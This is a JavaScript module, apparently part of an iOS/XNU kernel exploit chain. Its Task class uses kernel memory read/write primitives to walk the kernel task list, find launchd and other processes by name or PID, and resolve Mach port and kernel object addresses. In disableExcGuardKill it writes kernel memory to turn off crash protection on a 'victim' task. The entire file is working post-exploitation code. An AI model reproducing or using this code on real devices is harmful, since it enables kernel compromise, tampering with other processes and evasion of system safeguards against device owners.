import SelfTaskStruct from "./SelfTaskStruct";
import Utils from "libs/JSUtils/Utils";
import Chain from "libs/Chain/Chain";
import Native from "libs/Chain/Native";

const TAG = "TASK"
const TASK_EXC_GUARD_MP_CORPSE = 0x40;
const TASK_EXC_GUARD_MP_FATAL = 0x80;
const TASK_EXC_GUARD_MP_DELIVER = 0x10;

export default class Task
{
	static gSelfTask;
	static KALLOC_ARRAY_TYPE_SHIFT;

	static {
		this.gSelfTask = new SelfTaskStruct();
	}

	static init(selfTaskAddr)
	{
		// Update KALLOC_ARRAY_TYPE_SHIFT
		this.KALLOC_ARRAY_TYPE_SHIFT = BigInt((64n - Chain.offsets().T1SZ_BOOT - 1n));

		/*
		 * This function should be invoked as the initializer of the this Task utility.
		 * It setups the global var "gSelfTask" containing values used all across the task functions to lookup ports.
		 * It also retrieves the "launchd" task address.
		 */
		this.gSelfTask.addr = selfTaskAddr;
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
		this.gSelfTask.portObject = this.#getPortObject(spaceTable, 0x203n);
		this.gSelfTask.launchdTask = this.#searchForLaunchdTask();

		console.log(TAG,`Self task address: ${Utils.hex(this.gSelfTask.addr)}`);
		console.log(TAG,`Self task space table: ${Utils.hex(spaceTable)}`);
		console.log(TAG,`Self task port object: ${Utils.hex(this.gSelfTask.portObject)}`);
		console.log(TAG,`launchd task: ${Utils.hex(this.gSelfTask.launchdTask)}`);
	}

	static trunc_page(addr)
	{
		return addr & (~(Utils.PAGE_SIZE - 1n));
	}

	static round_page(addr)
	{
		return this.trunc_page((addr) + (Utils.PAGE_SIZE - 1n));
	}

	static pidof(name)
	{
		let currTask = this.gSelfTask.launchdTask;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let command = Native.mem;
			Chain.read(procAddr + Chain.offsets().pComm, command, 18);
			let resultName = Native.readString(command,18);
			if(name === resultName)
			{
				let pid = Chain.read32(procAddr + Chain.offsets().pid);
				return pid;
			}
			let nextTask = Chain.read64(currTask + Chain.offsets().nextTask);
			if (!nextTask || nextTask == currTask)
				break;
			currTask = nextTask;
		}
		return 0;
	}

	static getTaskAddrByPID(pid)
	{
		let currTask = this.gSelfTask.launchdTask;

		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let currPid = Chain.read32(procAddr + Chain.offsets().pid);
			if (currPid == pid)
				return currTask;
			let nextTask = Chain.read64(currTask + Chain.offsets().nextTask);
			if (!nextTask || (nextTask == currTask))
				break;
			currTask = nextTask;
		}
		return 0;
	}

	static disableExcGuardKill(taskAddr)
	{
		// in mach_port_guard_ast, the victim would crash if these are on.
		let excGuard = Chain.read32(taskAddr + Chain.offsets().excGuard);
		//console.log(TAG,`Current excGuard:0x${Utils.hex(excGuard)}`);
		excGuard &= ~(TASK_EXC_GUARD_MP_CORPSE | TASK_EXC_GUARD_MP_FATAL);
		excGuard |= TASK_EXC_GUARD_MP_DELIVER;
		//console.log(TAG,`ExcGuard result:0x${Utils.hex(excGuard)}`);
		Chain.write32(taskAddr + Chain.offsets().excGuard, excGuard);
	}

	static getTaskAddrByName(name)
	{
		let currTask = this.gSelfTask.launchdTask;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let command = Native.mem;
			Chain.read(procAddr + Chain.offsets().pComm, command, 18);
			let resultName = Native.readString(command,18);
			//console.log(TAG, `${Utils.hex(procAddr)}: ${resultName}`);
			if(name === resultName)
			{
				//console.log(TAG, `Found target process: ${name}`);
				return currTask;
			}
			let nextTask = Chain.read64(currTask + Chain.offsets().nextTask);
			if (!nextTask || nextTask == currTask)
				break;
			currTask = nextTask;
		}
		return false;
	}

	static getRightAddr(port)
	{
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
		return this.#getPortEntry(spaceTable, port);
	}

	static #getSpaceTable(taskAddr)
	{
		let space = Chain.read64(taskAddr + Chain.offsets().ipcSpace);
		let spaceTable = Chain.read64(space + Chain.offsets().spaceTable);
		//console.log(TAG,`space: ${Utils.hex(space)}`);
		//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
		spaceTable = Chain.strip(spaceTable);
		//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
		return this.#kallocArrayDecodeAddr(BigInt(spaceTable));
	}

	static #mach_port_index(port)
	{
		return ((port) >> 8n);
	}

	static #getPortEntry(spaceTable, port)
	{
		let portIndex = this.#mach_port_index(port);
		return spaceTable + (portIndex * 0x18n);
	}

	static #getPortObject(spaceTable, port)
	{
		//console.log(TAG, `getPortObject(): space=${Utils.hex(spaceTable)}, port=${Utils.hex(port)}`);
		let portEntry = this.#getPortEntry(spaceTable, port);
		//console.log(TAG,`portEntry: ${Utils.hex(portEntry)}`);
		let portObject = Chain.read64(portEntry + Chain.offsets().entryObject);
		//console.log(TAG,`portObject:${Utils.hex(portObject)}`);
		return Chain.strip(portObject);
	}

	static getTaskProc(taskAddr)
	{
		let procROAddr = Chain.read64(taskAddr + Chain.offsets().procRO);
		let procAddr = Chain.read64(procROAddr);
		return procAddr;
	}

	static #searchForLaunchdTask()
	{
		/*
		 * Traverse the tasks list backwards starting from the self task until we find the proc with PID 1.
		 */

		let currTask = this.gSelfTask.addr;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let currPid = Chain.read32(procAddr + Chain.offsets().pid);
			if (currPid == 1)
				return currTask;
			let prevTask = Chain.read64(currTask + Chain.offsets().prevTask);
			if (!prevTask || prevTask === currTask)
				break;
			currTask = prevTask;
		}
		return 0n;
	}

	static #kallocArrayDecodeAddr(ptr)
	{
		let zone_mask = BigInt(1) << BigInt(this.KALLOC_ARRAY_TYPE_SHIFT);
		if (ptr & zone_mask)
		{
			ptr &= ~0x1fn;
		}
		else
		{
			ptr &= ~Utils.PAGE_MASK;
			//console.log(TAG,`ptr:${Utils.hex(ptr)}`);
			ptr |= zone_mask;
			//console.log(TAG,`ptr2:${Utils.hex(ptr)}`);
		}
		return ptr;
	}

	static getPortAddr(port)
	{
		if (!port)
			return 0;
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
		return this.#getPortObject(spaceTable, port);
	}

	static getPortKObject(port)
	{
		let portObject = this.getPortAddr(port);
		return this.#getPortKObjectByAddr(portObject);
	}

	static #getPortKObjectByAddr(portObject)
	{
		if (!portObject)
			return 0;
		let kobject = Chain.read64(portObject + Chain.offsets().objectKObject);
		return Chain.strip(kobject);
	}

	static firstThread(taskAddr)
	{
		let first = Chain.read64(taskAddr + Chain.offsets().threads);
		return first;
	}

	static getMap(taskAddr)
	{
		let vmMap = Chain.read64(taskAddr + Chain.offsets().mapTask);
		return vmMap;
	}

	static getPortKObjectOfTask(taskAddr,port)
	{
		let portObject = this.getPortAddrOfTask(taskAddr, port);
		return this.#getPortKObjectByAddr(portObject);
	}

	static getPortAddrOfTask(taskAddr, port)
	{
		let spaceTable = this.#getSpaceTable(taskAddr);
		return this.#getPortObject(spaceTable, port);
	}
}
